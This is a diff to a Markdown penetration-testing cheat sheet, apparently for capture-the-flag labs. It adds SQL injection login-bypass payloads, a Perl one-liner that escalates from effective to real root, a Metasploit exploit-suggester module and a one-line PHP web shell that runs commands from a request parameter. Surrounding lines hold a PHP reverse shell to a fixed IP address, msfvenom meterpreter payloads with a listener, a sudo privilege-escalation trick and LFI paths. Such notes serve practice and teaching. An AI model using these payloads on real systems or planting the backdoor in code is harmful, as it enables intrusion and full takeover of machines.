@@ -9,6 +9,7 @@
 			- [FeroxBuster](#feroxbuster)
 		- [MySQL Port 3306 \& MsSQL Port 1433](#mysql-port-3306--mssql-port-1433)
 		- [SMB Port 445,139 \& RPC Port 111,135](#smb-port-445139--rpc-port-111135)
+	- [SQL Injection](#sql-injection)
 	- [SHELL](#shell)
 		- [Stable Shell](#stable-shell)
 		- [Reverse shell](#reverse-shell)
@@ -20,6 +21,7 @@
 	- [PrivEsc](#privesc)
 		- [GTFOBin](#gtfobin)
 		- [sudo -l](#sudo--l)
+		- [EUID 0 to UID 0](#euid-0-to-uid-0)
 		- [LinPeas](#linpeas)
 	- [Enum](#enum)
 		- [List SUID files](#list-suid-files)
@@ -43,6 +45,7 @@
 		- [Meterpreter shell](#meterpreter-shell)
 		- [Generate tcp reverse shell](#generate-tcp-reverse-shell)
 		- [MSFConsol one line listener](#msfconsol-one-line-listener)
+		- [Suggester](#suggester)
 	- [LFI](#lfi)
 		- [Fuzz](#fuzz)
 		- [View php code](#view-php-code)
@@ -122,6 +125,18 @@ smbmap -H hack.thm -R
 smbmap -H $IP -d <domain> -u <user> -p <password>
 mount -t cifs //$IP/<share> <local dir> -o username="guest", password=""
 ```
+
+## SQL Injection
+
+`OR 1=1` can be dangerous if an UPDATE/DELETE is done after the SELECT
+
+Prefer using (you have to know the username)
+- admin'; -- -
+- admin' AND '1'='1
+
+That way, SELECT will return only one row
+
+https://book.hacktricks.xyz/pentesting-web/sql-injection
 
 ## SHELL
 
@@ -219,6 +234,12 @@ cewl -w wordslist.txt -d 10 http://$IP
 
 ```sh
 sudo -u#-1 /bin/bash
+```
+
+### EUID 0 to UID 0
+
+```bash
+perl -MEnglish -e '$UID = 0; $ENV{PATH} = "/bin:/usr/bin:/sbin:/usr/sbin"; exec "su - root"'
 ```
 
 ### LinPeas
@@ -442,6 +463,10 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT="1234" -f exe -
 sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT '1234'; exploit"
 ```
 
+### Suggester
+
+post/multi/recon/local_exploit_suggester
+
 ## LFI
 
 ### Fuzz
@@ -476,6 +501,12 @@ GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apa
   
 ```sh
 php -r '$sock=fsockopen("10.9.129.247",1234);exec("/bin/sh -i <&3 >&3 2>&3");
+```
+
+- Oneline backdoor
+
+```php
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
 ```
 
 ## SSTI
